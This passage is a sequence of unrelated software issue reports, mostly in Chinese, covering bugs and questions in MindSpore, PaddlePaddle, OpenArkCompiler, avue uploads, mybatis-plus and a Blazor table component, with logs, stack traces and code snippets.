self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E ValueError: Shape should have only one -2 or no -2 at all but got ([const vector][-1, -1, -2, -2]). E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/utils/shape_utils.h:43 IsDynamicRank /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/common/api.py:1150: ValueError"
如何给avue upload 空间赋值让图片回显,"如题，在开发过程中，我们希望开发基于avue-upload，结合我们自身的业务情况，开发附件上传下载功能。文件上传下载接口都已调通。但问题卡在下载的图片二进制转成blob本地地址后，不知道该用什么方法将图片回显到界面，请解决一下。 组件代码（vue）： 界面效果   <code>: &lt;template&gt; &lt;avue-upload :listType=""listType"" :loadText=""loadText"" :accept=""accept"" :tip=""tip"" :action=""uploadAction"" :data=""uploadData"" :fileSize=""fileSize"" :limit=""limit"" :propHttp=""propHttp"" :upload-preview=""uploadPreview"" :upload-error=""uploadError"" :upload-exceed=""uploadExceed"" :upload-delete=""uploadDelete"" :upload-before=""uploadBefore"" :upload-after=""uploadAfter"" :prop=""modalProp"" &gt; &lt;/avue-upload&gt; &lt;/template&gt; &lt;script&gt; import {downloadFile,deleteFile} from ""@/api/food/attach/attachUpload""; import {validatenull} from ""@/util/validate""; export default { name: ""SimpleImageUpload"", props: { uploadAction:{ type:String, default:()=&gt;{ return ""/blade-test/file/uploader""; } }, listType: { type:String, default:()=&gt;{ return ""picture-img""; } }, accept: { type:Array, default:()=&gt;{ return [""jpg"",""png""]; } }, tip:{ type:String, default:()=&gt;{ return ""只能上传jpg/png文件，且不超过500kb""; } }, module:{ type:String, default:()=&gt;{ return ""web""; } }, fileType:{ type:String, default:()=&gt;{ return ""jpg""; } }, limit:{ type:Number, default:()=&gt;{ return 1; } }, //文件大小kb 默认为500kb fileSize:{ type:Number, default:()=&gt;{ return 512000; } }, loadText:{ type:String, default:()=&gt;{ return ""附件上传中,请稍等""; } }, modalProp:{ type:String, default:()=&gt;{ return ""imgPath""; } } }, data(){ return { fileId:'', uploadData:{ module:this.module, type:this.fileType, }, propHttp:{ res:'data', }, imageUrl:null, } }, methods:{ uploadDelete(column,file) { this.$confirm(`这里是自定义的，是否确定移除该选项？`).then(()=&gt;{ if(validatenull(this.fileId)){ //执行删除 setTimeout(()=&gt;{ deleteFile(this.fileId).then(res=&gt;{ console.log(res); }) },0) } }); }, uploadBefore(file, done, loading,column) { this.$message.success('上传前的方法') done(); }, uploadError(error, column) { //console.log(error, column) if(error&amp;&amp;!validatenull(error)){ this.$message.error(error) } else { /* this.$message({ type: ""error"", message: ""未知错误!"" });*/ } }, uploadAfter(res, done, loading,column) { if(parseInt(res.code)==200){ console.log(1); this.fileId=res.data.id; downloadFile(this.fileId).then(res=&gt;{ let blobData = new Blob([res.data],{type:'image/png'}); let targetUrl = window.URL.createObjectURL(blobData); this.blobToBase64(blobData).then(base64Data=&gt;{ this.$emit(""showUploadImage"",{res:res,url:targetUrl,encodeUrl:base64Data}); }) }); done(); return; } }, uploadPreview(file,column,done){ //console.log(file,column) done()//默认执行打开方法 this.$message.success('自定义查看方法,查看控制台') }, uploadExceed(limit, files, fileList, column){ console.log(limit, files, fileList, column) this.$message.success('自定义查看方法,查看控制台'); }, submit() { this.$message.success('当前数据' + JSON.stringify(this.form)) }, blobToBase64(blob) { return new Promise((resolve, reject) =&gt; { const fileReader = new FileReader(); fileReader.onload = (e) =&gt; { resolve(e.target.result); }; // readAsDataURL fileReader.readAsDataURL(blob); fileReader.onerror = () =&gt; { reject(new Error('blobToBase64 error')); }; }); } } } 业务代码vue &lt;template&gt; &lt;basic-container&gt; &lt;avue-crud :option=""option"" :table-loading=""loading"" :data=""data"" :page.sync=""page"" :permission=""permissionList"" :before-open=""beforeOpen"" v-model=""form"" ref=""crud"" @row-update=""rowUpdate"" @row-save=""rowSave"" @row-del=""rowDel"" @search-change=""searchChange"" @search-reset=""searchReset"" @selection-change=""selectionChange"" @current-change=""currentChange"" @size-change=""sizeChange"" @refresh-change=""refreshChange"" @on-load=""onLoad""&gt; &lt;template slot=""menuLeft""&gt; &lt;el-button type=""danger"" size=""small"" icon=""el-icon-delete"" plain @click=""handleDelete""&gt;删除 &lt;/el-button&gt; &lt;/template&gt; &lt;template slot=""licenseFilePathForm"" &gt; &lt;simple-image-upload ref=""testPic"" listType=""picture-img"" v-model=""licenseFile"" :accept=""acceptArray"" @showUploadImage=""showUploadImage"" :modalProp=""uploadimg"" &gt; &lt;/simple-image-upload&gt; &lt;/template&gt; &lt;/avue-crud&gt; &lt;/basic-container&gt; &lt;/template&gt; &lt;script&gt; import {getList, getDetail, add, update, remove} from ""@/api/food/transport/transport""; import SimpleImageUpload from ""@/components/UploadFile/SimpleImageUpload""; import {mapGetters} from ""vuex""; export default { components:{ SimpleImageUpload }, data() { return { form: {}, uploadimg:'', currentForm:{}, query: {}, loading: true, licenseFile:null, page: { pageSize: 10, currentPage: 1, total: 0 }, selectionList: [], acceptArray:[""jpg"",""png""], option: { height:'auto', calcHeight: 30, tip: false, searchShow: true, searchMenuSpan: 6, menuWidth:140, border: true, index: true, indexLabel:'序号', addBtn:true, delBtn:true, viewBtn: false, editBtnText:'修 改', selection: true, dialogClickModal: false, column: [ { label: ""主键id"", prop: ""id"", hide:true, display:false, rules: [{ required: true, message: ""请输入主键id"", trigger: ""blur"" }] }, { label: ""企业名称"", labelWidth:120, align:""center"", prop: ""companyName"", minWidth:160, search:true, rules: [{ required: true, message: ""请输入企业名称"", trigger: ""blur"" }] }, { label: ""营业执照"", labelWidth:120, prop: ""licenseFilePath"", slot:true, hide: true, span: 24 }, ] }, data: [] }; }, computed: { ...mapGetters([""permission""]), permissionList() { return { addBtn: this.vaildData(this.permission.transport_add, false), viewBtn: this.vaildData(this.permission.transport_view, false), delBtn: this.vaildData(this.permission.transport_delete, false), editBtn: this.vaildData(this.permission.transport_edit, false) }; }, ids() { let ids = []; this.selectionList.forEach(ele =&gt; { ids.push(ele.id); }); return ids.join("",""); } }, methods: { rowSave(row, done, loading) { // console.log(row); let delFileIds=[]; if(validatenull(row.licenseFilePath)){ delFileIds.push(row.licenseFileId); row.licenseFileId=-1; } if(validatenull(row.carFilePath)){ delFileIds.push(row.carFileId); row.carFileId=-1; } row.delFileIds=delFileIds; add(row).then(() =&gt; { this.onLoad(this.page); this.$message({ type: ""success"", message: ""操作成功!"" }); done(); }, error =&gt; { loading(); window.console.log(error); }); }, rowUpdate(row, index, done, loading) { let delFileIds=[]; if(validatenull(row.licenseFilePath)){ delFileIds.push(row.licenseFileId); row.licenseFileId=-1; } if(validatenull(row.carFilePath)){ delFileIds.push(row.carFileId); row.carFileId=-1; } row.delFileIds=delFileIds; update(row).then(() =&gt; { this.onLoad(this.page); this.$message({ type: ""success"", message: ""操作成功!"" }); done(); }, error =&gt; { loading(); console.log(error); }); }, rowDel(row) { this.$confirm(""确定将选择数据删除?"", { confirmButtonText: ""确定"", cancelButtonText: ""取消"", type: ""warning"" }) .then(() =&gt; { return remove(row.id); }) .then(() =&gt; { this.onLoad(this.page); this.$message({ type: ""success"", message: ""操作成功!"" }); }); }, handleDelete() { if (this.selectionList.length === 0) { this.$message.warning(""请选择至少一条数据""); return; } this.$confirm(""确定将选择数据删除?"", { confirmButtonText: ""确定"", cancelButtonText: ""取消"", type: ""warning"" }) .then(() =&gt; { return remove(this.ids); }) .then(() =&gt; { this.onLoad(this.page); this.$message({ type: ""success"", message: ""操作成功!"" }); this.$refs.crud.toggleSelection(); }); }, beforeOpen(done, type) { done(); }, searchReset() { this.query = {}; this.onLoad(this.page); }, searchChange(params, done) { this.query = params; this.page.currentPage = 1; this.onLoad(this.page, params); done(); }, selectionChange(list) { this.selectionList = list; }, selectionClear() { this.selectionList = []; this.$refs.crud.toggleSelection(); }, currentChange(currentPage){ this.page.currentPage = currentPage; }, sizeChange(pageSize){ this.page.pageSize = pageSize; }, refreshChange() { this.onLoad(this.page, this.query); }, onLoad(page, params = {}) { this.loading = true; getList(page.currentPage, page.pageSize, Object.assign(params, this.query)).then(res =&gt; { const data = res.data.data; this.page.total = data.total; this.data = data.records; this.loading = false; this.selectionClear(); }); }, showUploadImage(obj){ //此处要如何回显图片？？？？ } } }; &lt;/script&gt; &lt;style scoped lang=""scss""&gt; &lt;/style&gt;"
Memory/dropout3,try to fix #8359:core.Operator should be removed result   <code>: thread0::conv2d_grad 13 130.102 0.449216 38.4108 10.0079 thread0::dropout 10 92.5427 8.7016 9.71072 9.25427 thread0::elementwise_add_grad 16 28.5715 0.04112 8.56918 1.78572 thread0::conv2d 13 8.89501 0.273952 1.22829 0.684231 thread0::pool2d_grad 5 1.06003 0.161408 0.32784 0.212006 thread0::batch_norm_grad 14 2.91728 0.08416 0.552 0.208377 thread0::batch_norm 14 2.83862 0.112352 0.477088 0.202759 thread0::accuracy 1 0.188992 0.188992 0.188992 0.188992 thread0::logsigmoid_grad 14 1.59779 0.02448 0.333408 0.114128 thread0::dropout_grad 10 0.962336 0.028128 0.318912 0.0962336 thread0::pool2d 5 0.479424 0.046912 0.168736 0.0958848 thread0::elementwise_add 16 1.40637 0.0264 0.244928 0.087898 thread0::logsigmoid 14 1.19264 0.024832 0.231904 0.0851886 thread0::mul_grad 3 0.2072 0.055872 0.07712 0.0690667
spec502----struct拷贝/赋值 优化处理,"tree-vrp.c----vrp_visit_phi_node 预期用 两条stp + 两条ldp 完成拷贝   <code>: LOC 47 6318 callassigned &amp;get_value_range (regread ptr %75) { regassign ptr %548} dassign %vr_arg_6312_4 4 (iread ptr &lt;* &lt;$value_range_d&gt;&gt; 4 (regread ptr %548)) dassign %vr_arg_6312_4 3 (iread ptr &lt;* &lt;$value_range_d&gt;&gt; 3 (regread ptr %548)) dassign %vr_arg_6312_4 2 (iread ptr &lt;* &lt;$value_range_d&gt;&gt; 2 (regread ptr %548)) dassign %vr_arg_6312_4 1 (iread u32 &lt;* &lt;$value_range_d&gt;&gt; 1 (regread ptr %548)) bl get_value_range ldr x1, [x0,#24] // [R748] [R2153] str x1, [sp,#72] // local var: vr_arg_6312_4 [R2153] ldr x1, [x0,#16] // [R748] [R2154] str x1, [sp,#64] // local var: vr_arg_6312_4 [R2154] ldr x1, [x0,#8] // [R748] [R2155] str x1, [sp,#56] // local var: vr_arg_6312_4 [R2155] ldr w0, [x0] // [R748] [R2156] str w0, [sp,#48] // local var: vr_arg_6312_4 [R2156]"
通用弹出框，再次打开时之前编辑的内容还在,"版本：vue 1，jquery，layui，node 6 若干个工单里的某按钮，都需要打开这个弹出框，尝试了很多方法，弹出框内容都还是保留的上一次打开时的编辑值。 关键代码： 尝试了很多方法：、、、 等都失败。 现在正在尝试，父组件 renderKey 一直自增，子组件 watch 到后清空，但是也 watch 不到： 目前每次打开，之前如果报修部件是四行并选择了，下次还是这四行。需求应该是下次打开，变成一行，重新选择部件。 现状：子组件内部清空数组的话，立马清空，UI 上重新选择部件；但父组件调用子组件的清空函数，清空失败，UI 上还是之前的数组长度。 现状：所有 console 打印的值均正常，均是数组已被清空，但重新打开弹框时，UI 上依然没清空   <code>: this.currentUI.open({ type: 1, //Page层类型 ... content: $(""#replaceFaultUI""), btn: ['确认提交', '取消'], success: function (index, layero) { self.renderKey += 1 // fullPage 时，清空子组件内部数组失败 self.$refs.replace_fault.fullPage(obj); }, yes: function (index, layero) { self.renderKey += 1 self.$refs.replace_fault.submitHandler(); }, end: function (index) { self.renderKey += 1 // 销毁时，清空子组件内部数组失败 self.$refs.replace_fault.clearInfo(); } }); v-if :key ref.forceUpdate nextTick"
Feature/enhance evaluator,"Make Evaluator invoke layers.py, simplify the implementation Add comments remove the method, since users can directly new a class Fix #5825:在10.0没有Ubuntu的安装包，怎么安装的   <code>: accuracy Accuarcy"
【GDB dwarf】static 变量无法打印,"编译命令 错误的结果 无法打印 foo 中的 static 变量 funclocal、funclocal_bss、funclocal_ro 的值 预期结果   <code>: ${MAPLE_BUILD_OUTPUT}/bin/hir2mpl -g StaticDebug.ast -o StaticDebug.mpl ${MAPLE_BUILD_OUTPUT}/bin/maple -O0 -g StaticDebug.mpl aarch64-linux-gnu-gcc -static -L../../lib/c -std=c89 -o StaticDebug.exe StaticDebug.s -lst -lm static int filelocal = 2; /* In Data section */ static int filelocal_bss; /* In BSS section */ static const int filelocal_ro = 202; /* In Read-Only Data section */ void foo () { void bar (); static int funclocal = 3; /* In Data section */ static int funclocal_bss; /* In BSS section */ static const int funclocal_ro = 203; /* RO Data */ static const int funclocal_ro_bss; /* RO Data */ funclocal_bss = 103; bar (); } void bar () { static int funclocal = 4; /* In data section */ static int funclocal_bss; /* In BSS section */ funclocal_bss = 104; } int main() { foo (); return 0; } (gdb) b main Breakpoint 1 at 0x4004a4: file StaticDebug.c, line 29. (gdb) b foo Breakpoint 2 at 0x400494: file StaticDebug.c, line 17. (gdb) r Starting program: /home/daixianze/code/OAC/maple/OpenArkCompiler/testsuite/c_test/ast_test/AST0101-staticDebug/StaticDebug.exe Breakpoint 1, main () at StaticDebug.c:29 29 foo (); (gdb) c Continuing. Breakpoint 2, foo () at StaticDebug.c:17 17 bar (); (gdb) p funclocal Cannot access memory at address 0xffffdeadb73f (gdb) p funclocal_bss Cannot access memory at address 0xffffdeadb73f (gdb) p funclocal_ro Cannot access memory at address 0xffffdeadb73f (gdb) (gdb) b main Breakpoint 1 at 0x764: file StaticDebug.c, line 29. (gdb) b foo Breakpoint 2 at 0x724: file StaticDebug.c, line 16. (gdb) r Starting program: /home/daixianze/code/OAC/maple/OpenArkCompiler/testsuite/c_test/ast_test/AST0101-staticDebug/StaticDebug_gcc Breakpoint 1, main () at StaticDebug.c:29 29 foo (); (gdb) c Continuing. Breakpoint 2, foo () at StaticDebug.c:16 16 funclocal_bss = 103; (gdb) p funclocal $1 = 3 (gdb) p funclocal_bss $2 = 0 (gdb) p funclocal_ro $3 = 203 (gdb)"
手持端装车复核后为什么状态是更新成“复核中”而不是“复核完了”？,"t.setDownSta(Constants.wm_sta5); 只更新为复核中   <code>: //装车复核 @RequestMapping(value = ""/change"", method = RequestMethod.POST, consumes = MediaType.APPLICATION_JSON_VALUE) @ResponseBody public ResponseEntity&lt;?&gt; update(@RequestParam String wmToDownGoodsstr, UriComponentsBuilder uriBuilder) { // 调用JSR303 Bean Validator进行校验，如果出错返回含400错误码及json格式的错误信息. ResultDO D0 = new ResultDO(); WmToDownGoodsEntity wmToDownGoods = (WmToDownGoodsEntity)JSONHelper.json2Object(wmToDownGoodsstr,WmToDownGoodsEntity.class); WmToDownGoodsEntity t = wmToDownGoodsService.get(WmToDownGoodsEntity.class,wmToDownGoods.getId()); // 保存 try { MyBeanUtils.copyBeanNotNull2Bean(wmToDownGoods, t); t.setDownSta(Constants.wm_sta5); t.setUpdateDate(now());"
@Distance 注解在动态多排序条件下无法正常使用,"版本 : 1.0.0 描述 : 业务需求场景是默认距离排序必选. 但是除了距离排序以外可能存在0~n个其他排序条件(用户动态选择). ee构建sort参数的时候默认把距离排序的参数放到最后一位构建. 导致 注解的 无法使用. 因为硬编码阶段无法知道距离排序参数是第几位. 建议 : 距离排序条件构建时 , 默认放在首位构建 (index=0). 往往根据距离排序查询时 , 都需要回显距离数值. 这样也整好匹配了 默认值0   <code>: @Distance sortBuilderIndex sortBuilderIndex"
paddle升级到gpu-0.14.0版本后原有训练任务出错,"升级之后GPU运行原有任务（只是每天训练数据的差异，理论上不会有数据差异），报错： 改用CPU运行时有时可以跑一些batch，多数情况下报错并卡死在这里： 另外之前的版本trainer_count &gt; 1是可以正常使用的，新版本&gt;1时不能训练么？   <code>: I0718 14:57:56.227458 1672 Util.cpp:166] commandline: --use_gpu=True --trainer_count=1 I0718 14:58:02.015449 1672 GradientMachine.cpp:94] Initing parameters.. I0718 14:58:05.849926 1672 GradientMachine.cpp:101] Init parameters done. F0718 14:58:24.706127 1672 Matrix.cpp:653] Not supported *** Check failure stack trace: *** @ 0x7f9fe05c868d google::LogMessage::Fail() @ 0x7f9fe05cc13c google::LogMessage::SendToLog() @ 0x7f9fe05c81b3 google::LogMessage::Flush() @ 0x7f9fe05cd64e google::LogMessageFatal::~LogMessageFatal() @ 0x7f9fe03df2c6 paddle::GpuMatrix::mul() @ 0x7f9fe02e3235 paddle::FullyConnectedLayer::forward() @ 0x7f9fe01da79d paddle::NeuralNetwork::forward() @ 0x7f9fe01b1ee3 paddle::GradientMachine::forwardBackward() @ 0x7f9fe05a44e4 GradientMachine::forwardBackward() @ 0x7f9fe013cff9 _wrap_GradientMachine_forwardBackward @ 0x7fa0173053d3 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa017307272 PyEval_EvalCode @ 0x7fa01732165c run_mod @ 0x7fa017321730 PyRun_FileExFlags @ 0x7fa017322c3c PyRun_SimpleFileExFlags @ 0x7fa0173344fc Py_Main @ 0x38bfc21b45 (unknown) Thread [140325559519040] Forwarding __fc_layer_0__, *** Aborted at 1531897104 (unix time) try ""date -d @1531897104"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x1f400000688) received by PID 1672 (TID 0x7fa01720c740) from PID 1672; stack trace: *** @ 0x38c040f130 (unknown) @ 0x38bfc359d9 (unknown) @ 0x38bfc370e8 (unknown) @ 0x7f9fe05d2bcb google::FindSymbol() @ 0x7f9fe05d358a google::GetSymbolFromObjectFile() @ 0x7f9fe05d3c52 google::SymbolizeAndDemangle() @ 0x7f9fe05d1458 google::DumpStackTrace() @ 0x7f9fe05d1516 google::DumpStackTraceAndExit() @ 0x7f9fe05c868d google::LogMessage::Fail() @ 0x7f9fe05cc13c google::LogMessage::SendToLog() @ 0x7f9fe05c81b3 google::LogMessage::Flush() @ 0x7f9fe05cd64e google::LogMessageFatal::~LogMessageFatal() @ 0x7f9fe03df2c6 paddle::GpuMatrix::mul() @ 0x7f9fe02e3235 paddle::FullyConnectedLayer::forward() @ 0x7f9fe01da79d paddle::NeuralNetwork::forward() @ 0x7f9fe01b1ee3 paddle::GradientMachine::forwardBackward() @ 0x7f9fe05a44e4 GradientMachine::forwardBackward() @ 0x7f9fe013cff9 _wrap_GradientMachine_forwardBackward @ 0x7fa0173053d3 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa0173054d1 PyEval_EvalFrameEx @ 0x7fa017307160 PyEval_EvalCodeEx @ 0x7fa017307272 PyEval_EvalCode @ 0x7fa01732165c run_mod @ 0x7fa017321730 PyRun_FileExFlags @ 0x7fa017322c3c PyRun_SimpleFileExFlags Aborted"
paddle_pserver2 err ,"Hi, log:   <code>: Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:./start_server.sh: line 33: 42473 Aborted GLOG_logtostderr=0 GLOG_log_dir=""./log"" ./paddle_pserver2 --num_gradient_servers=${OMPI_COMM_WORLD_SIZE} --nics=${nics} ${server_arg} --rdma_tcp=${rdma_tcp} --comment=$comment Fri Mar 9 08:34:38 2018[1,8]&lt;stderr&gt;:F0309 08:34:38.208967 43912 ParameterServer2.cpp:158] Check failed: !configMap_.count(config.para_id()) Duplicated parameter name: ___fc_layer_1__.wbias Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:+ check_return 'paddle_pserver2 failed' Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:+ '[' 134 -ne 0 ']' Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:+ echo '[./start_server.sh : 34] [main]' Fri Mar 9 08:34:38 2018[1,7]&lt;stderr&gt;:F0309 08:34:38.206758 20904 ParameterServer2.cpp:158] Check failed: !configMap_.count(config.para_id()) Duplicated parameter name: ___fc_layer_1__.wbias Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:[./start_server.sh : 34] [main] Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:+ echo '[FATAL]: paddle_pserver2 failed' Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:[FATAL]: paddle_pserver2 failed Fri Mar 9 08:34:38 2018[1,4]&lt;stderr&gt;:+ get_stack"
[CT][MS][LITE] [ASCEND_310_arm] compile testcase fail,"ascend_arm 310 测试用例编译失败 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 工程流水线编译用例 预期测试用例编译成功   <code>: slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/mindspore-lite-2.0.0-linux-aarch64/runtime/3rd/opencv/lib:/home/jenkins-slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/mindspore-lite-2.0.0-linux-aarch64/runtime/3rd_party/hwhiai-ddk-100.320.010.010/lib:/home/jenkins-slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/mindspore-lite-2.0.0-linux-aarch64/runtime/lib:/home/jenkins-slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/predict_test/cases/frame/ge_migrate/testcase/cpp/lite/common/3rd/opencv/lib:/home/jenkins-slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/mindspore-lite-2.0.0-linux-aarch64/runtime/build/3rd:/home/jenkins-slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/predict_test/cases/frame/ge_migrate/testcase/cpp/lite/inference/net/cpp -lmindspore-lite -ldl -lpthread -lpthread 13:45:04 /usr/bin/ld: /home/jenkins-slave/workspace/MSLite_Compile_Testcase_Ubuntu180402/release/mindspore-lite-2.0.0-linux-aarch64/runtime/lib/libmindspore-lite.so: undefined reference to `mindspore::lite::GetAllSectionInfoFromConfigFile(std::string const&amp;, std::map&lt;std::string, std::map&lt;std::string, std::string, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, std::string&gt; &gt; &gt;, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, std::map&lt;std::string, std::string, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, std::string&gt; &gt; &gt; &gt; &gt; &gt;*)'"
mybatis-plus-boot-starter 2.2.0通过Java Config方式setTypeAliasesPackage不生效问题,"Java Config: XML描述：（xml的路径是src/main/java下） 错误描述： Caused by: org.apache.ibatis.builder.BuilderException: Error resolving class. Ca use: org.apache.ibatis.type.TypeException: Could not resolve type alias 'TUser'. Cause: java.lang.ClassNotFoundException: Cannot find class: TUser at org.apache.ibatis.builder.BaseBuilder.resolveClass(BaseBuilder.java:1 18) at org.apache.ibatis.builder.xml.XMLStatementBuilder.parseStatementNode( XMLStatementBuilder.java:74) at org.apache.ibatis.builder.xml.XMLMapperBuilder.buildStatementFromCont ext(XMLMapperBuilder.java:135) at org.apache.ibatis.builder.xml.XMLMapperBuilder.buildStatementFromCont   <code>: &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.2.0&lt;/version&gt; &lt;/dependency&gt; @Bean(""mybatisSqlSession"") public SqlSessionFactory sqlSessionFactory(DataSource dataSource, ResourceLoader resourceLoader, GlobalConfiguration globalConfiguration) throws Exception { MybatisSqlSessionFactoryBean sqlSessionFactory = new MybatisSqlSessionFactoryBean(); sqlSessionFactory.setDataSource(dataSource); sqlSessionFactory.setTypeAliasesPackage(""com.mp.entity""); MybatisConfiguration configuration = new MybatisConfiguration(); configuration.setDefaultScriptingLanguage(MybatisXMLLanguageDriver.class); configuration.setJdbcTypeForNull(JdbcType.NULL); sqlSessionFactory.setConfiguration(configuration); sqlSessionFactory.setPlugins(new Interceptor[]{ paginationInterceptor(), new PerformanceInterceptor(), // &lt;!-- 性能拦截器，兼打印sql，不建议生产环境配置--&gt; new OptimisticLockerInterceptor() }); sqlSessionFactory.setGlobalConfig(globalConfiguration); return sqlSessionFactory.getObject(); } &lt;select id=""selectUserList"" resultType=""TUser""&gt; SELECT * FROM t_user WHERE id=#{id} &lt;/select&gt;"
Table扩展支持3种数据类型,"对于Table的CRUD。 目前只支持一种变量及 能够支持3种变量，查询，新增，编辑 往往查询的字段与新增和编辑的数量可能不同。 新增比编辑的字段要少，一些Id，CreateTime和默认值的字段 这里是不需要的。[Required]也可能不同。 就是为了体现在点击[新增]和[编辑]里面弹出的表单编辑页的不同。 在点击[新增]或[编辑]的时候，可以 1.通过api获取对应的[新增]或[编辑]数据 2.通过转换将QueryDTO Mapping成AddDto或者UpdateDto。（这种情况QueryDto是全字段）。 理想代码如下：   <code>: &lt;Table TItem=""UserQueryDto""&gt; &lt;/Table&gt; DataServiceBase&lt;UserQueryDto,UserAddDto,UserUpdateDto&gt; &lt;Table TItem=""UserQueryDto"" TAddItem=""UserAddDto"" TUpdateItem=""UserUpdateDto""&gt; &lt;TableColumns&gt; &lt;/TableColuns&gt; &lt;AddTemplate&gt; &lt;TableColumns&gt; &lt;/TableColuns&gt; &lt;AddTemplate&gt; &lt;TableColumns&gt; &lt;EditTemplate 也可以自定义&gt; &lt;/TableColuns&gt; &lt;UpdateTempalte&gt; &lt;TableColumns&gt; &lt;/TableColumns&gt; &lt;/UpdateTempalte&gt; &lt;/Table&gt;"
【众智】【计算-AICPU开发】UpperBound,AICPU算子接入 sorted_x values output Infer时确认输出数据类型 对应底层算子 对应底层AI CPU算子UpperBound：   <code>: class UpperBound (Primitive):
[MS][NET][MASS][310 infer]Covert MindIR model to OM model failed,": /device ascend : -- MindSpore version :commit_id:e789642e -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C77/20210311 test_ms_mass_gigaword_310_mindir_perf.py get code from example export mindir 310 infer Covert MindIR model to OM model failed network 310 infer success MASS网络在ascend 环境 310推理失败   <code>: [ERROR] GE(82931,main):2021-03-18-02:55:21.971.283 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Default/decoder-BeamSearchDecoder/decoder-TransformerDecoderStep/decoder-TransformerDecoder/layer5-DecoderCell/enc_dec_attn-SelfAttention/multi_head_self_attention-MultiHeadAttention/softmax-Softmax/Softmax-op52519 does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:21.972.286 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Default/decoder-BeamSearchDecoder/decoder-TransformerDecoderStep/decoder-TransformerDecoder/layer1-DecoderCell/masked_attn-SelfAttention/multi_head_self_attention-MultiHeadAttention/Cast-op52239 does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:21.973.325 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Default/decoder-BeamSearchDecoder/decoder-TransformerDecoderStep/decoder-TransformerDecoder/layer2-DecoderCell/masked_attn-SelfAttention/multi_head_self_attention-MultiHeadAttention/Cast-op52303 does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:21.974.331 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Default/decoder-BeamSearchDecoder/decoder-TransformerDecoderStep/decoder-TransformerDecoder/layer3-DecoderCell/masked_attn-SelfAttention/multi_head_self_attention-MultiHeadAttention/Cast-op52367 does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:21.975.362 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Default/decoder-BeamSearchDecoder/decoder-TransformerDecoderStep/decoder-TransformerDecoder/layer4-DecoderCell/masked_attn-SelfAttention/multi_head_self_attention-MultiHeadAttention/Cast-op52431 does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:21.976.364 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Default/decoder-BeamSearchDecoder/decoder-TransformerDecoderStep/decoder-TransformerDecoder/layer5-DecoderCell/masked_attn-SelfAttention/multi_head_self_attention-MultiHeadAttention/Cast-op52495 does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:21.977.294 [graphengine/metadef/graph/compute_graph.cc:950]82931 TopologicalSortingGraph: ErrorNo: -1(failed) The node Node_Output does not itered when topological sorting [ERROR] GE(82931,main):2021-03-18-02:55:22.003.936 [graphengine/metadef/graph/compute_graph.cc:887]82931 TopologicalSorting: ErrorNo: -1(failed) Graph [30856_30855_1_construct_wrapper] topological sort failed, saved to file black_box [ERROR] GE(82931,main):2021-03-18-02:55:22.003.969 [graph_preprocess.cc:1933]82931 PrepareOptimize: ErrorNo: -1(failed) Graph topological sort failed, ret:4294967295. [ERROR] GE(82931,main):2021-03-18-02:55:22.004.002 [graph_preprocess.cc:1561]82931 PrepareDynShape: ErrorNo: -1(failed) Failed to process Prepare_PrepareOptimize [ERROR] GE(82931,main):2021-03-18-02:55:22.004.014 